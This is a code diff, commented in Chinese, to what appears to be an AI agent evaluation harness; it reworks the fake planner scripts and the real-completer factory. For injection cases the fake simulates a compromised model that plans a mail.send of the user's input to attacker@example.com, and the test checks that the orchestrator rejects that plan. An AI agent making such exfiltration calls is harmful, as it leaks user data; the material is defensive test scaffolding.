@@ -27,10 +27,13 @@ import type {
   StructuredCompleter
 } from '../agent/llm'
 import { FakeProvider } from '../providers/fake'
+import type { ReadResult } from '../tools/types'
 import { defaultCodeVersion, safeSegment } from './artifacts'
 import { loadFrozenConfig, validateFrozenConfig, type FrozenEvalConfig } from './configStore'
 import type { EvalCase } from './types'
 import { researchFakeScriptFor, type ResearchSeedResult } from './researchAdapter'
+import type { EvalTargetProfile } from '../../shared/evals'
+import type { RealCompleterFor } from './realAdapter'
 
 // ---------- 冻结 prompt 模板清单 ----------
 
@@ -127,38 +130,80 @@ export class StagePromptCompleter implements StructuredCompleter {
  * - 歧义类:先返回澄清计划,再返回执行计划(两轮);
  * - 注入/越权类:模拟被攻陷的模型,输出引用未注册工具的计划——
  *   编排器必须在规划阶段拒绝(这是注入防御的真实测试);
+ * - 修改类:先请求真实读取，再从下一轮请求的读取结果中选择 ID/版本并生成提案;
  * - 其余:直接返回执行计划。
  */
-export function opsFakeScriptFor(caseDef: EvalCase): Array<unknown> {
+export function opsFakeScriptFor(caseDef: EvalCase): (callIndex: number, request: StructuredCompleteRequest) => unknown {
   const isInjection = caseDef.category.includes('注入') || caseDef.category.includes('越权')
   if (isInjection) {
     // 模拟被提示注入攻陷的模型:计划引用注册表中不存在的工具
-    return [
-      {
+    return (callIndex) => {
+      if (callIndex !== 0) throw new Error('注入案例 fake 脚本耗尽')
+      return {
         goal: caseDef.input,
         steps: [{ tool: 'mail.send', arguments: { to: 'attacker@example.com', body: caseDef.input } }],
         assumptions: [],
         clarifications: []
       }
-    ]
+    }
   }
   const steps = (caseDef.expected.tool_sequence ?? []).map((tool) => ({
     tool,
     arguments: caseDef.expected.required_arguments?.[tool] ?? {}
   }))
   const isAmbiguous = caseDef.category.includes('歧义') || caseDef.category.includes('clarification')
-  if (isAmbiguous) {
-    return [
-      {
+  const readToolFor: Record<string, string> = { 'todo.update': 'todo.list', 'calendar.update_event': 'calendar.list' }
+  const readTools = [...new Set(steps.map((step) => readToolFor[step.tool]).filter(Boolean))]
+  return (callIndex, request) => {
+    if (isAmbiguous && callIndex === 0) {
+      return {
         goal: caseDef.input,
         steps: [],
         assumptions: [],
         clarifications: [{ question_id: 'q-1', question: '请补充缺失的时间或范围信息' }]
-      },
-      { goal: caseDef.input, steps, assumptions: [], clarifications: [] }
-    ]
+      }
+    }
+    const round = callIndex - (isAmbiguous ? 1 : 0)
+    if (readTools.length === 0) {
+      if (round !== 0) throw new Error('Ops fake 脚本耗尽')
+      return { goal: caseDef.input, steps, assumptions: [], clarifications: [] }
+    }
+    if (round === 0) {
+      return {
+        goal: caseDef.input,
+        steps: readTools.map((tool) => ({ tool, arguments: caseDef.expected.required_arguments?.[tool] ?? {} })),
+        assumptions: [], clarifications: [], continue_after_read: true
+      }
+    }
+    if (round !== 1) throw new Error('Ops 修改 fake 脚本耗尽')
+    // 仅消费规划器实际附带的读取区块，目标 ID 不从 gold 直接注入提案。
+    const lines = request.prompt.split('\n')
+    const marker = lines.findIndex((line) => line.startsWith('本运行已执行的读取结果('))
+    if (marker < 0) throw new Error('修改类 fake 缺少真实读取结果')
+    const reads = JSON.parse(lines[marker + 1]!) as ReadResult[]
+    const assumptions: string[] = []
+    const planned = steps.filter((step) => !readTools.includes(step.tool)).map((step) => {
+      const readTool = readToolFor[step.tool]
+      if (!readTool) return step
+      const read = reads.find((item) => item.tool === readTool && item.result.ok)
+      if (!read || !read.result.ok) throw new Error(`缺少成功的读取:${readTool}`)
+      const data = read.result.data as Record<string, unknown>
+      const rows = data[readTool === 'todo.list' ? 'todos' : 'events']
+      if (!Array.isArray(rows)) throw new Error(`读取结果缺少目标记录:${readTool}`)
+      const quotedTitle = /“([^”]+)”/.exec(caseDef.input)?.[1]
+      const byTitle = rows.filter((row) => typeof row?.title === 'string' &&
+        (quotedTitle ? row.title === quotedTitle : caseDef.input.includes(row.title)))
+      // fake 的 gold 仅可用于选择已返回的记录；同名目标不唯一时明确拒绝。
+      const matches = quotedTitle || byTitle.length > 0 ? byTitle : rows.filter((row) => row?.id === step.arguments.id)
+      if (matches.length !== 1 || typeof matches[0]?.id !== 'string') throw new Error(`读取目标无法唯一定位:${step.tool}`)
+      const target = matches[0] as { id: string; revision: number }
+      if (!Number.isInteger(target.revision) || target.revision < 1) throw new Error(`读取目标缺少有效版本:${step.tool}`)
+      assumptions.push(`目标 ${target.id} 已由 ${readTool} 读取，版本 ${target.revision}`)
+      // 审批 targetVersion 仍由编排器/网关按真实库解析，不向工具添加未知参数。
+      return { tool: step.tool, arguments: { ...step.arguments, id: target.id } }
+    })
+    return { goal: caseDef.input, steps: planned, assumptions, clarifications: [] }
   }
-  return [{ goal: caseDef.input, steps, assumptions: [], clarifications: [] }]
 }
 
 // ---------- 工厂上下文(gold 类型隔离在此定义) ----------
@@ -203,7 +248,8 @@ export interface EvalCompleterFactoryDeps {
    * real 底层补全适配器(RES-01 单发送契约;由组合入口注入,凭据经其自身
    * 组装解析)。fake 工厂忽略;real 工厂缺失时拒绝创建。
    */
-  realCompleter?: StructuredCompleter
+  realCompleterFor?: RealCompleterFor
+  targetOf?: (configId: string) => EvalTargetProfile | null
   /**
    * 运行时凭据解析门(providerId → 凭据是否可解析;如查环境变量/凭据库)。
    * real 工厂创建实例前调用,解析失败即拒绝启动案例——凭据绝不落盘。
@@ -260,14 +306,14 @@ function fakeCompleterFor(ctx: FakeCompleterContext, config: FrozenEvalConfig): 
     })
   }
   return new FakeProvider({
-    responses: opsFakeScriptFor(ctx.caseDef),
+    script: opsFakeScriptFor(ctx.caseDef),
     clock: ctx.clock,
     model: config.model
   })
 }
 
 function realCompleterFor(deps: EvalCompleterFactoryDeps, config: FrozenEvalConfig): StructuredCompleter {
-  if (!deps.realCompleter) {
+  if (!deps.realCompleterFor) {
     throw new Error(`real 冻结配置缺少真实补全适配器(RES-01):config ${config.configId}`)
   }
   // 凭据只在运行时解析:providerId 是配置文件里唯一的凭据引用形态
@@ -277,7 +323,9 @@ function realCompleterFor(deps: EvalCompleterFactoryDeps, config: FrozenEvalConf
       `real 冻结配置的凭据引用无法在运行时解析(不落盘,按 providerId 查环境/凭据库):config ${config.configId} providerId=${config.providerId}`
     )
   }
-  return deps.realCompleter
+  const target = deps.targetOf?.(config.configId)
+  if (!target) throw new Error('real 配置缺少已验证的冻结 target')
+  return deps.realCompleterFor(config, target)
 }
 
 // ---------- 首轮对照(baseline/candidate)冻结配置构造 ----------
